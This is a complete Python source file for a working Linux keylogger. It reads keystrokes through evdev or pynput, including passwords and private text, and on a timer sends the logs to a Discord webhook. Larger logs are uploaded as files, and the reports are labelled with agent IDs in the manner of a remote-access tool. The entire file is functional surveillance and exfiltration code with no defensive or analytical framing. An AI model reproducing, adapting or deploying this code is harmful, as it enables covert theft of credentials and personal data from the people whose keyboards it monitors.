# -*- coding: utf-8 -*-
"""Linux keylogger — evdev (preferred) or pynput; reports to Discord webhook."""

from __future__ import annotations

import os
import select
import tempfile
import threading
import time
from datetime import datetime
from threading import Timer

import requests

STOP = False


def _normalize_key_name(name: str) -> str:
    if len(name) > 1:
        if name == "space":
            return " "
        if name == "enter":
            return "[ENTER]\n"
        if name == "decimal":
            return "."
        name = name.replace(" ", "_")
        return "[" + name.upper() + "]"
    return name


def _list_keyboard_paths():
    from evdev import InputDevice, ecodes, list_devices

    found = []
    for path in list_devices():
        try:
            dev = InputDevice(path)
            keys = dev.capabilities().get(ecodes.EV_KEY, [])
            # Real keyboards usually expose A-Z; lab UInput may expose a subset.
            if ecodes.KEY_A in keys and (
                ecodes.KEY_Z in keys or ecodes.KEY_B in keys or len(keys) >= 10
            ):
                found.append(path)
        except (OSError, PermissionError):
            continue
    return found


class Keylogger:
    def __init__(self, interval, ID, webhook, report_method="webhook"):
        self.id = ID
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.webhook = webhook
        self.backend = None
        self._devices = []
        self._lock = threading.Lock()
        global STOP
        STOP = False

    def probe(self):
        """Return (ok, message). Prefer evdev keyboards; else pynput if DISPLAY."""
        evdev_err = "evdev unavailable"
        try:
            found = _list_keyboard_paths()
            if found:
                self.backend = "evdev"
                self._devices = found
                return True, "evdev:" + ",".join(found)
            evdev_err = "no keyboard event device"
        except ImportError:
            evdev_err = "evdev not installed"
        except Exception as e:
            evdev_err = str(e)

        display = os.environ.get("DISPLAY")
        if display:
            try:
                import pynput  # noqa: F401

                self.backend = "pynput"
                return True, "pynput:" + display
            except ImportError:
                return False, "no usable input device (evdev missing keyboard; pynput not installed)"
        return False, "no usable input device (" + evdev_err + "; no DISPLAY for pynput)"

    def _append(self, name: str):
        global STOP
        if STOP:
            return
        with self._lock:
            self.log += _normalize_key_name(name)

    def report_to_webhook(self):
        global STOP
        if STOP:
            return
        if not self.webhook or self.webhook in ("None", "none", ""):
            return
        with self._lock:
            text = self.log
        title = "Keylogger Report | Agent#" + str(self.id) + " | Time: " + str(self.end_dt)
        try:
            if len(text) > 2000:
                fd, path = tempfile.mkstemp(prefix="keylog_", suffix=".txt")
                os.close(fd)
                try:
                    with open(path, "w", encoding="utf-8") as fh:
                        fh.write(title + "\n\n")
                        fh.write(text)
                    with open(path, "rb") as fh:
                        requests.post(
                            self.webhook,
                            data={"username": "Keylogger"},
                            files={"file": ("report.txt", fh, "text/plain")},
                            timeout=30,
                        )
                finally:
                    try:
                        os.remove(path)
                    except OSError:
                        pass
            else:
                payload = {
                    "username": "Keylogger",
                    "embeds": [{"title": title, "description": text or "(no keys)"}],
                }
                requests.post(self.webhook, json=payload, timeout=30)
        except Exception:
            pass

    def report(self):
        global STOP
        if STOP:
            return
        with self._lock:
            has = bool(self.log)
        if has:
            self.end_dt = datetime.now()
            if self.report_method == "webhook":
                self.report_to_webhook()
            self.start_dt = datetime.now()
        with self._lock:
            self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def _run_evdev(self):
        from evdev import InputDevice, categorize, ecodes

        fds = {}
        last_scan = 0.0

        def open_path(path):
            try:
                dev = InputDevice(path)
                fds[dev.fd] = dev
                return True
            except OSError:
                return False

        for path in self._devices:
            open_path(path)

        while not STOP:
            now = time.time()
            if now - last_scan > 1.0:
                last_scan = now
                try:
                    for path in _list_keyboard_paths():
                        if any(getattr(d, "path", None) == path for d in fds.values()):
                            continue
                        open_path(path)
                except Exception:
                    pass
            if not fds:
                time.sleep(0.3)
                continue
            r, _, _ = select.select(list(fds), [], [], 0.5)
            for fd in r:
                dev = fds.get(fd)
                if not dev:
                    continue
                try:
                    for event in dev.read():
                        if event.type != ecodes.EV_KEY:
                            continue
                        key_event = categorize(event)
                        if key_event.keystate != key_event.key_down:
                            continue
                        code = key_event.keycode
                        if isinstance(code, (list, tuple)):
                            code = code[0]
                        name = str(code)
                        if name.startswith("KEY_"):
                            name = name[4:].lower()
                        self._append(name)
                except OSError:
                    try:
                        del fds[fd]
                    except KeyError:
                        pass

    def _run_pynput(self):
        from pynput import keyboard

        def on_release(key):
            global STOP
            if STOP:
                return False
            try:
                name = key.char
                if name is None:
                    return
            except AttributeError:
                name = str(key).replace("Key.", "")
            self._append(name)

        with keyboard.Listener(on_release=on_release) as listener:
            while not STOP:
                if not listener.running:
                    break
                listener.join(0.5)

    def start(self):
        global STOP
        STOP = False
        ok, _msg = self.probe()
        if not ok:
            return False
        self.start_dt = datetime.now()
        self.report()
        if self.backend == "evdev":
            self._run_evdev()
        elif self.backend == "pynput":
            self._run_pynput()
        return True

    def stop(self):
        global STOP
        STOP = True
